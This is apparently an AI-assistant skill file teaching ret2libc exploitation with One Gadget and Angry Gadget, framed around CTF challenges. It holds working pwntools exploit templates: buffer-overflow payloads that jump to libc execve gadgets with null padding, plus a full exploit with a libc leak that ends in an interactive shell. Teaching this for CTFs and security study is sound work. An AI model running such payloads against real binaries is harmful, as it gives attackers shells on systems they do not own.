---
name: one-gadget-rop
description: How to use One Gadget and Angry Gadget for ret2lib attacks in binary exploitation. Use this skill whenever the user mentions ret2lib, one-gadget, one_gadget, finding shell gadgets in libc, execve gadgets, ROP chains for shell spawning, or any binary exploitation task involving libc gadgets. Also use when the user is working on CTF challenges, buffer overflows, or return-oriented programming that needs to spawn a shell without traditional system("/bin/sh").
---

# One Gadget ROP Helper

A skill for using One Gadget and Angry Gadget to find shell-spawning gadgets in libc for ret2lib attacks.

## What This Skill Does

This skill helps you:
- Find one-gadget addresses in libc that spawn shells with a single ROP chain entry
- Understand and satisfy gadget constraints (like `[rsp+0x30] == NULL`)
- Generate proper ROP chains with one-gadget addresses
- Use Angry Gadget as a fallback when One Gadget finds no gadgets
- Handle different architectures (x86_64, ARM64)

## When to Use This Skill

Use this skill when:
- You need to spawn a shell in a binary exploitation challenge
- You're doing ret2lib attacks and want to avoid building complex ROP chains
- You have libc addresses and need to find execve gadgets
- One Gadget returns no results and you need alternatives
- You're working on CTF challenges involving buffer overflows and libc exploitation

## Core Concepts

### What is One Gadget?

[One Gadget](https://github.com/david942j/one_gadget) finds addresses in libc that execute `execve("/bin/sh")` with a single ROP chain entry. This simplifies exploitation by:
- Eliminating the need for `system("/bin/sh")` chains
- Reducing ROP chain complexity
- Working even when `/bin/sh` string isn't in memory

### Common Constraints

One Gadget gadgets often have constraints. The most common:

| Constraint | Meaning | How to Satisfy |
|------------|---------|----------------|
| `[rsp+0x30] == NULL` | Stack at offset 0x30 must be NULL | Add padding with `\x00` bytes |
| `[rsp+0x20] == NULL` | Stack at offset 0x20 must be NULL | Add padding with `\x00` bytes |
| `rdx == NULL` | RDX register must be NULL | Ensure RDX is cleared or controlled |
| `rdi == NULL` | RDI register must be NULL | Ensure RDI is cleared or controlled |

### Basic Usage Pattern

```python
from pwn import *

# Get libc base address (from leak or known)
libc_base = libc.address

# One Gadget address (from one_gadget output)
ONE_GADGET_OFFSET = 0x4526a  # Example offset
ONE_GADGET = libc_base + ONE_GADGET_OFFSET

# Build ROP chain with padding for constraints
rop_chain = p64(ONE_GADGET) + b"\x00" * 100  # Padding for [rsp+0x30] == NULL

# Send the payload
io.sendline(rop_chain)
```

## Step-by-Step Workflow

### Step 1: Find One Gadget Addresses

```bash
# Install one_gadget (if not already installed)
# Download from: https://github.com/david942j/one_gadget/releases

# Run against your libc
./one_gadget /path/to/libc.so.6
```

Example output:
```
0x4526a  ; rdx == NULL
0x45276  ; rdx == NULL
0xf0364  ; rdx == NULL
```

### Step 2: Choose a Gadget

Pick a gadget with constraints you can satisfy. Prefer gadgets with:
- Fewer constraints
- Constraints you can easily meet (like NULL stack values)

### Step 3: Calculate the Address

```python
# In pwntools
libc_base = libc.address  # From leak or known
one_gadget_offset = 0x4526a  # From one_gadget output
one_gadget_addr = libc_base + one_gadget_offset
```

### Step 4: Build the ROP Chain

```python
from pwn import *

# Basic chain with NULL padding
rop = p64(one_gadget_addr) + b"\x00" * 100

# Or with specific constraint handling
rop = p64(one_gadget_addr)
rop += b"\x00" * 0x30  # Satisfy [rsp+0x30] == NULL
```

### Step 5: Send the Payload

```python
# For buffer overflow
io.sendline(rop)

# For ret2libc
payload = b"A" * offset + p64(one_gadget_addr) + b"\x00" * 100
io.sendline(payload)
```

## Using Angry Gadget

When One Gadget finds no gadgets (common on ARM64 or newer libc versions), use [Angry Gadget](https://github.com/ChrisTheCoolHut/angry_gadget):

```bash
# Install
pip install angry_gadget

# Run against libc
angry_gadget.py /path/to/libc.so.6
```

Angry Gadget:
- Uses angr for constraint solving
- Finds more gadgets with complex constraints
- May require more work to satisfy constraints

## Architecture-Specific Notes

### x86_64

One Gadget works well on x86_64. Common offsets:
- `0x4526a` - Common in glibc 2.23-2.31
- `0xf0364` - Alternative in some versions

### ARM64

One Gadget often finds no gadgets on ARM64 (especially Kali 2023.3+). Use Angry Gadget instead:

```bash
angry_gadget.py libc.so.6
```

## Common Pitfalls

### Pitfall 1: Forgetting to Add libc Base

```python
# WRONG - using offset directly
ONE_GADGET = 0x4526a  # This is just an offset!

# RIGHT - add libc base
ONE_GADGET = libc.address + 0x4526a
```

### Pitfall 2: Not Satisfying Constraints

```python
# WRONG - no padding
rop = p64(ONE_GADGET)

# RIGHT - add padding for [rsp+0x30] == NULL
rop = p64(ONE_GADGET) + b"\x00" * 100
```

### Pitfall 3: Wrong Endianness

```python
# WRONG - string instead of packed
rop = "\x6a\x25\x04\x00\x00\x00\x00\x00"

# RIGHT - use p64
rop = p64(ONE_GADGET)
```

## Integration with pwntools

```python
from pwn import *

# Setup
context.arch = 'amd64'
context.os = 'linux'

# Get libc (from leak or known)
libc = ELF('./libc.so.6')

# Find one_gadget
one_gadget_offset = 0x4526a
one_gadget = libc.address + one_gadget_offset

# Build payload
payload = b"A" * 0x118  # Buffer offset
payload += p64(one_gadget)
payload += b"\x00" * 100  # Constraint padding

# Send
io = process('./vuln')
io.sendline(payload)
io.interactive()
```

## Debugging Tips

### Check if libc is Correct

```python
# Verify libc base
print(f"libc base: {hex(libc.address)}")
print(f"one_gadget: {hex(one_gadget)}")
```

### Test Constraints

```python
# Check what constraints your gadget has
# Run: ./one_gadget libc.so.6
# Look for the constraint next to your chosen offset
```

### Verify Shell Spawn

```python
# After sending payload, check if shell spawned
io.interactive()
# If you get a shell, it worked!
# If not, check constraints and libc address
```

## Example: Complete Exploit

```python
from pwn import *

# Setup
context.log_level = 'debug'
context.arch = 'amd64'

# Connect
io = process('./vuln')

# Leak libc (example)
libc_leak = u64(io.recv(6) + b"\x00\x00")
libc_base = libc_leak - 0x21900  # Adjust offset

# One Gadget
one_gadget_offset = 0x4526a
one_gadget = libc_base + one_gadget_offset

# Build payload
payload = b"A" * 0x118
payload += p64(one_gadget)
payload += b"\x00" * 100

# Send
io.sendline(payload)
io.interactive()
```

## Quick Reference

| Task | Command/Code |
|------|-------------|
| Find gadgets | `./one_gadget libc.so.6` |
| Install Angry Gadget | `pip install angry_gadget` |
| Run Angry Gadget | `angry_gadget.py libc.so.6` |
| Calculate address | `one_gadget = libc.address + offset` |
| Build chain | `p64(one_gadget) + b"\x00" * 100` |
| Send payload | `io.sendline(payload)` |

## Resources

- [One Gadget GitHub](https://github.com/david942j/one_gadget)
- [Angry Gadget GitHub](https://github.com/ChrisTheCoolHut/angry_gadget)
- [pwntools Documentation](https://docs.pwntools.com/)

## When This Skill Doesn't Apply

This skill is specifically for:
- ret2lib attacks using libc gadgets
- Binary exploitation with known libc
- CTF challenges involving buffer overflows

Don't use this skill for:
- Format string vulnerabilities (use format-string skill)
- Heap exploitation (use heap-exploitation skill)
- Kernel exploitation (different techniques)
- Web application security (different domain)
